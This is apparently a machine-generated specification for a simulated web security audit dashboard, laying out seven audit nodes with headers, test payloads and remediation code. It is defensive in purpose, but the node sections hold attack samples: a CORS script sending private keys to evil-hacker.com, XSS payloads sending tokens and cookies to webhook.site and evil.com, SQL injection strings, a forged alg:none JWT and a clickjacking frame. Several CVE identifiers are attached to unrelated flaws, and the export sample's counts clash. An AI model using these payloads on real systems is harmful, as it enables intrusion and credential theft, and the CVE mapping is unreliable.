# Architectural & Specification Survey: R1 Security Audit & Vulnerability Scanner
**Target Path**: `c:\DevWork\Depredador\Flujoweb\sistemas\security-audit\index.html`  
**System Name**: Defensive Cybersecurity Observability Hub & Interactive Vulnerability Scanner  
**Document Type**: Authoritative Technical Specification & Implementation Blueprint  
**Specification Miner**: explorer_security

---

## 1. Executive Summary & Architectural Overview

The **Security Audit & Vulnerability Scanner** (`sistemas/security-audit/index.html`) is an enterprise-grade, single-file interactive cybersecurity diagnostic console designed with a Cyberpunk visual aesthetic. It models and executes a 7-stage automated penetration testing sequence across perimeter defenses, transport cryptography, API endpoints, identity tokens, and storage tiers.

### Key Capabilities:
1. **7-Stage Workflow Stepper**: Sequential execution through 7 critical security audit nodes with realistic delays, active spinner rings, and animated connection paths.
2. **Dynamic Circular SVG Score Gauge**: Real-time calculated global security health rating (0–100) with animated numeric count-up, letter grades (`A+`, `A`, `B`, `C`, `F`), and multi-stop color interpolation.
3. **Interactive Telemetry & Deep Inspection Drawer**: Slide-over drawer presenting raw HTTP request/response headers, exploitation payloads, CVE identifiers, CVSS v3.1 vector strings, and multi-language remediation code.
4. **Vulnerability Matrix with Multi-Tier Filtering**: Filterable tabular audit report supporting severity filters (`All`, `Critical`, `High`, `Medium / Low`, `Patched`), dynamic full-text search, and an interactive **"Simulate Fix / Patch"** engine that updates stepper nodes and recalculates the global security score in real time.
5. **JSON Export & Executive Summary Modal**: Generates timestamped compliance reports for export and displays an executive modal summary for CISO briefings.
6. **Persistent Glowing Emoji Icons**: Thematic emoji icons (🔒, 🛡️, 🌐, 💉, 📜, 🔑, 📋) remain permanently illuminated across all lifecycle states (`pending`, `active`, `passed`, `warning`, `critical`, `patched`).
7. **Single-File Zero-Dependency Architecture**: 100% self-contained single-file HTML5/CSS3/ES6+ application with zero build steps or runtime npm dependencies.

---

## 2. Complete State Machine & Step Sequence

### 2.1 Workflow Stepper Nodes Specification

| Node # | Identifier | Emoji & Title | Focus Domain | Initial Status | Point Weight | Initial CVSS |
|---|---|---|---|---|---|---|
| **Node 1** | `tls_audit` | 🔒 **SSL / TLS 1.3 & Cipher Suites** | Transport Layer Security | Warning (Missing HSTS Preload) | 15 pts | 5.3 (Medium) |
| **Node 2** | `headers_audit` | 🛡️ **HTTP Security Headers** | Perimeter / Browser Policy | Critical (Missing CSP & Frame Options) | 15 pts | 7.5 (High) |
| **Node 3** | `cors_audit` | 🌐 **CORS & Origin Security** | Cross-Origin Policy | Critical (Wildcard + Credentials Reflection) | 15 pts | 8.8 (High) |
| **Node 4** | `sqli_audit` | 💉 **SQL Injection & Sanitization** | Data Layer / Injection | Critical (Unparameterized Search Query) | 15 pts | 9.8 (Critical) |
| **Node 5** | `xss_audit` | 📜 **Cross-Site Scripting (XSS)** | Client-Side / DOM Sanitization | High (Unsanitized DOM innerHTML Render) | 15 pts | 8.2 (High) |
| **Node 6** | `jwt_audit` | 🔑 **Session & JWT Integrity** | Authentication & Token Security | Critical (Acceptance of `alg: none` tokens) | 15 pts | 9.1 (Critical) |
| **Node 7** | `rbac_audit` | 📋 **RBAC & Endpoint Access Matrix** | Authorization & Rate Limiting | High (BOLA / IDOR Tenant Leakage) | 10 pts | 8.5 (High) |

*Baseline Initial Score*: **42 / 100 (Grade F - Critical Exposure)**  
*Fully Patched Score*: **100 / 100 (Grade A+ - Hardened / Zero CVEs)**

---

### 2.2 Global State Machine & Transitions

```
   ┌────────────────────────────────────────────────────────┐
   │                        [IDLE]                          │
   │  - Stepper in standby (muted glow, opacity 0.4)        │
   │  - Score Gauge at 0 (uncalculated / placeholder)       │
   │  - Vulnerability Matrix hidden or in preview state     │
   └──────────────────────────┬─────────────────────────────┘
                              │
                    [Click "Iniciar Auditoría"]
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │                      [SCANNING]                        │
   │  - Sequential node activation (1 -> 2 -> ... -> 7)     │
   │  - Step duration: 800ms - 1100ms per node              │
   │  - Active node has rotating cyber ring + cyan pulse    │
   │  - Progress track fills progressively (0% -> 100%)     │
   │  - Streaming ANSI audit logs emitted to console        │
   └──────────────────────────┬─────────────────────────────┘
                              │
                    [All 7 Nodes Evaluated]
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │                     [COMPLETED]                        │
   │  - Score Gauge animates from 0 -> Initial Score (42/F) │
   │  - Nodes transition to respective status colors        │
   │  - Track line fades to subtle ambient line (opacity .1)│
   │  - Vulnerability Matrix table fully interactive        │
   └─────────────┬──────────────────────────┬───────────────┘
                 │                          │
      [Click "Simulate Fix"]       [Click Node / Matrix Row]
                 │                          │
                 ▼                          ▼
   ┌───────────────────────────┐  ┌─────────────────────────┐
   │    [PATCH SIMULATION]     │  │   [INSPECTION DRAWER]   │
   │ - Node flips to emerald   │  │ - Raw HTTP headers      │
   │ - Row status -> PATCHED   │  │ - Exploitation vector   │
   │ - Live score recalculates │  │ - CVE & CVSS info       │
   │ - Log records patch event │  │ - Multi-language fixes  │
   └───────────────────────────┘  └─────────────────────────┘
```

---

### 2.3 Node Status Transitions & Styling Specifications

| Node State | Border & Background | Spin Ring Animation | Emoji Visual Filter | Status Label & Sub-Metric |
|---|---|---|---|---|
| `pending` | Border: `rgba(239,68,68,0.15)`, Background: `#060d1b` | Opacity 0 (hidden) | `saturate(0.3) brightness(0.4)` | Dim Gray `rgba(200,220,255,0.25)` ("STANDBY") |
| `active` | Border: `#00e5ff`, Background: `radial-gradient(circle, rgba(0,229,255,0.12), #060d1b 70%)` | Spinning Cyan Ring (`animation: spinRing 1.2s linear infinite`) | `saturate(1) brightness(1.1) drop-shadow(0 0 8px #00e5ff)` | Pulsing Cyan `#00e5ff` ("AUDITING...") |
| `done-passed` | Border: `#10b981`, Background: `radial-gradient(circle, rgba(16,185,129,0.15), #060d1b 70%)` | Static Emerald Halo (`box-shadow: 0 0 20px rgba(16,185,129,0.35)`) | `saturate(1.2) drop-shadow(0 0 10px #10b981)` | Neon Green `#10b981` ("PASS / 0 CVE") |
| `done-warning` | Border: `#f59e0b`, Background: `radial-gradient(circle, rgba(245,158,11,0.15), #060d1b 70%)` | Amber Halo (`box-shadow: 0 0 20px rgba(245,158,11,0.35)`) | `saturate(1.1) drop-shadow(0 0 10px #f59e0b)` | Amber Gold `#f59e0b` ("WARN / CVSS 5.3") |
| `done-critical` | Border: `#ef4444`, Background: `radial-gradient(circle, rgba(239,68,68,0.20), #060d1b 70%)` | Pulsing Crimson Halo (`animation: alertPulse 2s ease infinite`) | `saturate(1.2) drop-shadow(0 0 12px #ef4444)` | Crimson Red `#ef4444` ("CRITICAL / CVSS 9.8") |
| `patched` | Border: `#10b981`, Background: `radial-gradient(circle, rgba(16,185,129,0.25), #060d1b 70%)` | Emerald Aura (`box-shadow: 0 0 24px rgba(16,185,129,0.50)`) | `saturate(1.3) drop-shadow(0 0 12px #10b981)` | Emerald `#10b981` ("PATCHED / SECURE") |

---

## 3. Exhaustive Telemetry Data Models for All 7 Nodes

### 3.1 Node 1: SSL / TLS 1.3 & Cipher Suites (`tls_audit`)
- **Identifier**: `tls_audit`
- **Emoji**: 🔒
- **Title**: SSL / TLS 1.3 & Cipher Suites
- **Category**: Transport Layer Security & Cryptographic Posture
- **Initial Status**: `WARNING` | **CVSS Score**: `5.3` (Medium) | **Weight**: `15 pts` (Current: 8 pts)
- **CVE Reference**: `CVE-2023-44487` (HTTP/2 Rapid Reset & Transport Downgrade) / `CWE-319`
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`
- **Evaluated Headers**:
```http
HTTP/2 200 OK
Server: cloud-edge/3.4.1
Strict-Transport-Security: max-age=86400
X-SSL-Protocol: TLSv1.3
X-SSL-Cipher: TLS_AES_256_GCM_SHA384
X-SSL-Cert-Issuer: CN=Let's Encrypt Authority X3
X-SSL-Cert-Valid-Days: 28
X-SSL-ALPN: h2,http/1.1
```
- **Identified Flaws**:
  1. HSTS `max-age` is only 86400s (1 day) instead of minimum 31536000s (1 year).
  2. Missing `includeSubDomains` and `preload` directives in HSTS header.
  3. Certificate expiration in 28 days (below 30-day automated renewal window).
- **Simulated Test Payload / Command**:
```bash
openssl s_client -connect api.cyber-core.internal:443 -tls1_3 -alpn h2,http/1.1
testssl.sh --hsts --pfs --ciphers all https://api.cyber-core.internal
```
- **Remediation Code Snippet**:
```nginx
# Nginx TLS 1.3 Hardening & Strict HSTS Preload
ssl_protocols TLSv1.3;
ssl_prefer_server_ciphers off;
ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256';
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
ssl_session_tickets off;
```

---

### 3.2 Node 2: HTTP Security Headers (`headers_audit`)
- **Identifier**: `headers_audit`
- **Emoji**: 🛡️
- **Title**: HTTP Security Headers & Sandboxing
- **Category**: Perimeter Defense & Browser Sandboxing
- **Initial Status**: `CRITICAL` | **CVSS Score**: `7.5` (High) | **Weight**: `15 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2023-38606` / `CWE-1021` (Clickjacking / Missing Frame Restrictions) / `CWE-693`
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
- **Evaluated Headers**:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Powered-By: Express
Server: Apache/2.4.52 (Ubuntu)
# [CRITICAL MISSING]: Content-Security-Policy
# [CRITICAL MISSING]: X-Frame-Options
# [CRITICAL MISSING]: X-Content-Type-Options
# [CRITICAL MISSING]: Permissions-Policy
# [CRITICAL MISSING]: Referrer-Policy
```
- **Identified Flaws**:
  1. Absence of `Content-Security-Policy` header exposes site to arbitrary script injection.
  2. Missing `X-Frame-Options` enables UI redressing and clickjacking in hidden iframes.
  3. Missing `X-Content-Type-Options: nosniff` allows MIME-type sniffing attacks.
  4. Technology stack disclosure in `X-Powered-By: Express` and `Server` banner.
- **Simulated Test Payload / Verification**:
```html
<!-- Clickjacking Proof-of-Concept Exploit Frame -->
<iframe src="https://api.cyber-core.internal/settings/transfer" 
        style="opacity:0.0001;position:absolute;z-index:999;width:500px;height:500px"></iframe>
```
- **Remediation Code Snippet**:
```javascript
// Node.js Express Helmet Hardening Middleware
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'strict-dynamic'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      frameAncestors: ["'none'"]
    }
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  hidePoweredBy: true
}));
```

---

### 3.3 Node 3: CORS & Origin Security (`cors_audit`)
- **Identifier**: `cors_audit`
- **Emoji**: 🌐
- **Title**: CORS & Origin Security Policy
- **Category**: Cross-Origin Resource Sharing & Data Privacy
- **Initial Status**: `CRITICAL` | **CVSS Score**: `8.8` (High) | **Weight**: `15 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2023-28115` / `CWE-942` (Permissive Cross-Origin Policy with Credentials)
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
- **Evaluated Headers**:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, X-API-Key
```
- **Identified Flaws**:
  1. Spec violation: Combining wildcard `*` origin with `Access-Control-Allow-Credentials: true`.
  2. Dynamic origin reflection: Server reflects arbitrary `Origin: https://attacker.com` without whitelist validation.
  3. Preflight caching is set to 0, exposing internal routing topology.
- **Simulated Test Payload / Exploitation**:
```javascript
// Cross-Origin Key Exfiltration Exploit Script
fetch('https://api.cyber-core.internal/api/v1/user/private-keys', {
  method: 'GET',
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://evil-hacker.com/dump?keys=' + encodeURIComponent(JSON.stringify(data)));
});
```
- **Remediation Code Snippet**:
```typescript
// Strict Origin Whitelist CORS Middleware
const ALLOWED_ORIGINS = new Set([
  'https://app.cyber-core.internal',
  'https://admin.cyber-core.internal'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
  }
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
```

---

### 3.4 Node 4: SQL Injection & Input Sanitization (`sqli_audit`)
- **Identifier**: `sqli_audit`
- **Emoji**: 💉
- **Title**: SQL Injection & Query Sanitization
- **Category**: Data Tier Integrity & Query Parameterization
- **Initial Status**: `CRITICAL` | **CVSS Score**: `9.8` (Critical) | **Weight**: `15 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2023-34362` (MOVEit Style Blind/Direct SQLi) / `CWE-89`
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Evaluated Target Endpoint**: `GET /api/v1/inventory/search?query=1`
- **Identified Flaws**:
  1. Direct string interpolation into PostgreSQL query string without parameter binding.
  2. Detailed database error disclosure in 500 response bodies.
  3. Blind time-based delay functions (`pg_sleep(5)`) executed with zero WAF filtering.
- **Simulated Test Payloads**:
  - *Vector A (Union Extraction)*: `' UNION SELECT null, username, password_hash, role FROM admin_users--`
  - *Vector B (Time-Based Blind)*: `'; SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin')>0 THEN pg_sleep(5) ELSE pg_sleep(0) END--`
- **Remediation Code Snippet**:
```python
# Python AsyncPG / SQLAlchemy Parameterized Query Fix
# VULNERABLE: await db.execute(f"SELECT * FROM items WHERE name ILIKE '%{user_query}%'")

# SECURE: Fully Parameterized Prepared Statement
async def search_inventory(db: Connection, user_query: str):
    query = """
        SELECT item_id, name, sku, stock_count, unit_price 
        FROM items 
        WHERE name ILIKE $1 OR sku = $2
        LIMIT 50
    """
    return await db.fetch(query, f"%{user_query}%", user_query)
```

---

### 3.5 Node 5: Cross-Site Scripting (XSS) (`xss_audit`)
- **Identifier**: `xss_audit`
- **Emoji**: 📜
- **Title**: Cross-Site Scripting & DOM Isolation
- **Category**: Client-Side Code Execution & DOM Isolation
- **Initial Status**: `HIGH` | **CVSS Score**: `8.2` (High) | **Weight**: `15 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2024-21626` / `CWE-79` (Improper Neutralization of Input in Web Output)
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
- **Evaluated Target Endpoint**: `POST /api/v1/feedback/render-preview`
- **Identified Flaws**:
  1. Client application injects unescaped Markdown HTML directly via `element.innerHTML`.
  2. Server fails to encode HTML entities `< > " '` in reflected API responses.
  3. SVG/MathML payload bypasses basic regex `<script>` keyword filter.
- **Simulated Test Payloads**:
  - *Vector A*: `<svg/onload="fetch('https://webhook.site/steal?jwt='+localStorage.getItem('token'))">`
  - *Vector B*: `<img src=x onerror="this.src='https://evil.com/k?k='+document.cookie">`
  - *Vector C*: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
- **Remediation Code Snippet**:
```javascript
// Pure Client & Server-Side DOMPurify Sanitation
import DOMPurify from 'dompurify';

// SECURE: Strict Hook Sanitization Before DOM Injection
function renderUserContent(dirtyHtml, targetElement) {
  const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'class'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'svg', 'math', 'object', 'embed'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  });
  targetElement.innerHTML = cleanHtml;
}
```

---

### 3.6 Node 6: Session & JWT Integrity (`jwt_audit`)
- **Identifier**: `jwt_audit`
- **Emoji**: 🔑
- **Title**: Session & JWT Cryptographic Integrity
- **Category**: Authentication Tokens & Cryptographic Verification
- **Initial Status**: `CRITICAL` | **CVSS Score**: `9.1` (Critical) | **Weight**: `15 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2022-21449` (Psychic Signatures / Alg None Bypass) / `CWE-287`
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
- **Evaluated Target Endpoint**: `POST /api/v1/auth/verify-session`
- **Identified Flaws**:
  1. JWT validator accepts algorithm `"alg": "none"` header, allowing arbitrary claim forging.
  2. Session cookie missing `SameSite=Strict` and `HttpOnly` flags.
  3. Token expiration (`exp`) claim is ignored when parsing expired refresh tokens.
- **Simulated Test Payload**:
```json
// Forged Header
{ "alg": "none", "typ": "JWT" }
// Forged Claims
{
  "sub": "usr_998822",
  "email": "attacker@cyber-ops.io",
  "role": "SUPER_ADMIN",
  "permissions": ["*"],
  "iat": 1724097600,
  "exp": 1755633600
}
// Signature: (empty string)
```
- **Remediation Code Snippet**:
```typescript
// Secure JWT Verification with Hardcoded RS256 Whitelist
import jwt from 'jsonwebtoken';

export function verifySessionToken(token: string): SessionPayload {
  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {
    algorithms: ['RS256'], // Rejects 'none' and symmetric 'HS256' key confusion attacks
    issuer: 'https://auth.cyber-core.internal',
    audience: 'https://api.cyber-core.internal',
    clockTolerance: 5 // Max 5s drift
  }) as SessionPayload;
}
```

---

### 3.7 Node 7: RBAC & Endpoint Access Matrix (`rbac_audit`)
- **Identifier**: `rbac_audit`
- **Emoji**: 📋
- **Title**: RBAC & Endpoint Access Matrix
- **Category**: Broken Object Level Authorization (BOLA) & API Rate Limiting
- **Initial Status**: `HIGH` | **CVSS Score**: `8.5` (High) | **Weight**: `10 pts` (Current: 0 pts)
- **CVE Reference**: `CVE-2023-22515` (Broken Access Control & Privilege Escalation) / `CWE-639` / `CWE-799`
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`
- **Evaluated Target Endpoint**: `GET /api/v1/organizations/{org_id}/invoices`
- **Identified Flaws**:
  1. BOLA / IDOR: Authenticated user from Org `102` can view full financial records of Org `101` by mutating `{org_id}` URL path parameter.
  2. Missing API rate limiter allows 10,000 requests/minute without HTTP 429 throttling.
  3. Missing vertical role check on administrative endpoint `/api/v1/system/audit-dump`.
- **Simulated Test Payload**:
```bash
# IDOR Extraction Probe
curl -X GET "https://api.cyber-core.internal/api/v1/organizations/101/invoices" \
     -H "Authorization: Bearer <USER_TOKEN_ORG_102>"
```
- **Remediation Code Snippet**:
```go
// Go RBAC & Tenant Ownership Guard Middleware
func RequireOrgAccess(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        userCtx := GetUserFromContext(r.Context())
        targetOrgID := chi.URLParam(r, "org_id")

        // Enforce Strict Tenant Boundary Check
        if userCtx.OrgID != targetOrgID && !userCtx.HasGlobalPermission("audit:read_all") {
            http.Error(w, `{"error":"FORBIDDEN_TENANT_ISOLATION_VIOLATION"}`, http.StatusForbidden)
            return
        }
        next(w, r)
    }
}
```

---

## 4. SVG Circular Score Gauge Implementation Mechanics

### 4.1 Geometric Parameters & Formula
- **ViewBox**: `0 0 140 140`
- **Center**: `(cx=70, cy=70)`
- **Radius**: $r = 56\text{px}$
- **Circumference**: 
  $$C = 2 \times \pi \times 56 \approx 351.85837\text{px}$$
- **Track Stroke Width**: `10px` (Background track `rgba(255,255,255,0.06)`, Foregound meter `#10b981` / `#ef4444`)
- **Stroke-Dashoffset Formula**:
  $$\text{offset} = C - \left(\frac{\text{score}}{100} \times C\right) = 351.858 \times \left(1 - \frac{\text{score}}{100}\right)$$

### 4.2 Score Calculation & Letter Grade Mapping

| Score Range | Letter Grade | Evaluation Status | Accent Color | Hex Code | Visual Shadow Glow |
|---|---|---|---|---|---|
| **95 – 100** | `A+` | **HARDENED / EXCELLENT** | Neon Emerald | `#10b981` | `0 0 25px rgba(16,185,129,0.55)` |
| **85 – 94** | `A` | **SECURE / GOOD** | Cyber Cyan | `#06b6d4` | `0 0 22px rgba(6,182,212,0.50)` |
| **70 – 84** | `B` | **ACCEPTABLE / MODERATE** | Amber Gold | `#f59e0b` | `0 0 20px rgba(245,158,11,0.45)` |
| **50 – 69** | `C` | **ELEVATED RISK** | Deep Orange | `#f97316` | `0 0 20px rgba(249,115,22,0.45)` |
| **0 – 49** | `F` | **CRITICAL EXPOSURE** | Cyber Crimson | `#ef4444` | `0 0 25px rgba(239,68,68,0.55)` |

### 4.3 Animation & Color Interpolation Engine
- **Interpolation Loop**: `requestAnimationFrame` interpolating between `previousScore` and `targetScore` over 800ms with exponential decay easing $E(t) = 1 - 2^{-10t}$.
- **Dynamic Color Lerp**:
```javascript
function getScoreColor(score) {
  if (score >= 95) return '#10b981'; // Emerald
  if (score >= 85) return '#06b6d4'; // Cyan
  if (score >= 70) return '#f59e0b'; // Amber
  if (score >= 50) return '#f97316'; // Orange
  return '#ef4444';                  // Crimson
}
```

---

## 5. Vulnerability Matrix Specifications & Live Patch Simulation

### 5.1 Matrix Table Data Model
The Vulnerability Matrix renders below the stepper with full interactive controls:

```
┌───────────┬───────────────┬──────────────────────────────────────────┬──────────┬────────────┬────────────────────────┐
│ SEVERITY  │ AUDIT VECTOR  │ VULNERABILITY & CVE                      │ CVSS v3  │ STATUS     │ ACTIONS                │
├───────────┼───────────────┼──────────────────────────────────────────┼──────────┼────────────┼────────────────────────┤
│ [CRITICAL]│ 💉 SQLi Audit │ Unparameterized SQL Query (CVE-2023-34362)│ 9.8      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [CRITICAL]│ 🔑 JWT Audit  │ Unsigned JWT 'alg: none' (CVE-2022-21449) │ 9.1      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [CRITICAL]│ 🌐 CORS Audit │ Insecure Origin Reflection (CVE-2023-28115│ 8.8      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [HIGH]    │ 📋 RBAC Audit │ BOLA / IDOR Tenant Leakage (CVE-2023-22515│ 8.5      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [HIGH]    │ 📜 XSS Audit  │ DOM InnerHTML Execution (CVE-2024-21626) │ 8.2      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [MEDIUM]  │ 🛡️ Headers    │ Missing CSP & Clickjack (CVE-2023-38606)  │ 7.5      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
│ [LOW]     │ 🔒 TLS Audit  │ Missing HSTS Preload (CVE-2023-44487)     │ 5.3      │ VULNERABLE │ [⚡ Simulate Fix] [🔍] │
└───────────┴───────────────┴──────────────────────────────────────────┴──────────┴────────────┴────────────────────────┘
```

### 5.2 Multi-Tier Filtering & Live Dynamic Search
- **Filter Tabs**:
  - `All (7)` — displays all findings.
  - `Critical (3)` — filters by CVSS $\ge 9.0$ and `CRITICAL` badge.
  - `High (2)` — filters by CVSS $8.0 - 8.9$ and `HIGH` badge.
  - `Medium / Low (2)` — filters by CVSS $\le 7.9$.
  - `Patched (0)` — dynamic counter reflecting user-patched items.
- **Dynamic Search Engine**:
  - Real-time text filtering listening on `input` event.
  - Matches across Title, CVE ID, CWE ID, Affected Component, and Severity keywords.
  - Shows clear counter: `"Mostrando X de Y vulnerabilidades"`.

### 5.3 "Simulate Fix / Patch" Mechanism
1. **Trigger**: User clicks `Simulate Fix` on row `k`.
2. **Animation Sequence**:
   - Button enters `loading` state (spinner for 350ms).
   - Button transforms into emerald `✓ PATCHED` badge.
   - Matrix row highlights with glowing green flash (`animation: patchGlow 1.2s`).
   - Stepper Node `k` status transitions to `patched` (`#10b981` border, neon green halo).
3. **Real-Time Score Recalculation**:
   - The deduction associated with row `k` is cleared.
   - Target score increases: $\text{Score}_{\text{new}} = \text{Score}_{\text{current}} + \Delta\text{pts}$.
   - SVG Circular Gauge animates upward with audio-visual feedback and updated grade badge.
4. **Audit Terminal Event**:
   - `[2026-08-19 23:35:12] [PATCH_ENGINE] Neutralized CVE-2023-34362 (SQLi). System posture improved (+15.0 pts). Current score: 57/100 (Grade: C)`.
5. **Batch Actions**:
   - `"Patch All Vulnerabilities"` button: Sequentially resolves all 7 findings, reaching a 100/100 `A+` Hardened posture.
   - `"Reset Audit"` button: Restores system to initial scanned state for repeatability.

---

## 6. JSON Export & Formatted Summary Modal Specifications

### 6.1 Export JSON Payload Structure
Clicking `"Export JSON Report"` generates a downloadable file `security-audit-report-<TIMESTAMP>.json`:

```json
{
  "reportId": "SEC-AUDIT-20260819-9F81B2",
  "generatedAt": "2026-08-19T23:35:00.000Z",
  "auditProfile": {
    "targetHost": "https://api.cyber-core.internal",
    "scannerEngine": "Depredador CyberSec Inspector v4.2",
    "scanDurationMs": 7420,
    "environment": "Production Cloud-Native Stack"
  },
  "scoreSummary": {
    "finalScore": 100,
    "initialScore": 42,
    "letterGrade": "A+",
    "complianceStatus": "SOC2_TYPE2_COMPLIANT / PCI-DSS_PASS",
    "totalChecks": 7,
    "passedCount": 7,
    "patchedCount": 5,
    "criticalRemaining": 0
  },
  "findings": [
    {
      "nodeId": "sqli_audit",
      "name": "SQL Injection & Input Sanitization",
      "cve": "CVE-2023-34362",
      "cwe": "CWE-89",
      "cvssScore": 9.8,
      "severity": "CRITICAL",
      "status": "PATCHED",
      "affectedEndpoint": "/api/v1/inventory/search",
      "evaluatedHeaders": {
        "Content-Type": "application/json",
        "X-Database-Engine": "PostgreSQL 15.2"
      },
      "remediationApplied": "Parameterized Prepared Statements with Strict Type Constraints"
    }
  ]
}
```

### 6.2 Executive Summary Modal Design
- **Backdrop**: `background: rgba(3, 8, 18, 0.85)` with `backdrop-filter: blur(12px)`.
- **Header**: Target Host, Scan UUID, Time elapsed, Final Grade Stamp (`A+` in emerald or `F` in crimson).
- **Executive Risk Matrix**: 4-quadrant mini-breakdown (Perimeter, Transport, Application, Identity).
- **Key Action Items**: Prioritized 3-bullet executive checklist.
- **Controls**:
  - `Download JSON`: Triggers direct client-side blob download.
  - `Copy Summary`: Copies formatted Markdown / plain text summary to clipboard with tooltip confirmation.
  - `Close (Esc)`: Closes modal seamlessly.

---

## 7. Cyberpunk Design Tokens & Visual Specifications

### 7.1 Color Palette & CSS Variables

```css
:root {
  /* Dark Void Base */
  --bg-dark: #030812;
  --bg-card: #060d1b;
  --bg-card-hover: #0c1528;
  --bg-surface: #111c35;

  /* Cyber Alert Red */
  --red-alert: #ef4444;
  --red-intense: #dc2626;
  --red-glow: rgba(239, 68, 68, 0.45);
  --red-subtle: rgba(239, 68, 68, 0.12);

  /* Neon Emerald */
  --green-neon: #10b981;
  --green-bright: #34d399;
  --green-glow: rgba(16, 185, 129, 0.45);
  --green-subtle: rgba(16, 185, 129, 0.12);

  /* Supporting Accents */
  --cyan-cyber: #00e5ff;
  --amber-warn: #f59e0b;
  --orange-risk: #f97316;

  /* Neutral Text & Borders */
  --text-primary: #e0eaff;
  --text-secondary: rgba(200, 220, 255, 0.65);
  --text-muted: rgba(200, 220, 255, 0.35);
  --border-subtle: rgba(200, 220, 255, 0.08);

  /* Fonts */
  --font-ui: 'Inter', system-ui, -apple-system, sans-serif;
  --font-mono: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', monospace;
}
```

### 7.2 Hex-Grid Background Architecture
The dark cinematic hex-grid is achieved using CSS pseudo-elements `body::before` and `body::after` layered beneath application content with `pointer-events: none; z-index: 0;`:

```css
body::before {
  content: '';
  position: fixed;
  inset: 0;
  background-image:
    linear-gradient(30deg, rgba(239, 68, 68, 0.02) 12%, transparent 12.5%, transparent 87%, rgba(239, 68, 68, 0.02) 87.5%),
    linear-gradient(150deg, rgba(239, 68, 68, 0.02) 12%, transparent 12.5%, transparent 87%, rgba(239, 68, 68, 0.02) 87.5%),
    linear-gradient(30deg, rgba(16, 185, 129, 0.015) 12%, transparent 12.5%, transparent 87%, rgba(16, 185, 129, 0.015) 87.5%),
    linear-gradient(150deg, rgba(16, 185, 129, 0.015) 12%, transparent 12.5%, transparent 87%, rgba(16, 185, 129, 0.015) 87.5%),
    linear-gradient(60deg, rgba(0, 229, 255, 0.015) 25%, transparent 25.5%, transparent 75%, rgba(0, 229, 255, 0.015) 75%);
  background-size: 44px 76px;
  background-position: 0 0, 0 0, 22px 38px, 22px 38px, 0 0;
  pointer-events: none;
  z-index: 0;
  opacity: 0.65;
}

body::after {
  content: '';
  position: fixed;
  inset: 0;
  background: radial-gradient(ellipse 65% 50% at 50% 25%, rgba(239, 68, 68, 0.04) 0%, rgba(16, 185, 129, 0.02) 40%, transparent 75%);
  pointer-events: none;
  z-index: 0;
}
```

### 7.3 Rule of Icon Persistence
**Crucial Requirement**: Across all states (`idle`, `active`, `done-passed`, `done-warning`, `done-critical`, `patched`), the emoji icon (🔒, 🛡️, 🌐, 💉, 📜, 🔑, 📋) is **NEVER replaced by a checkmark or cross**.
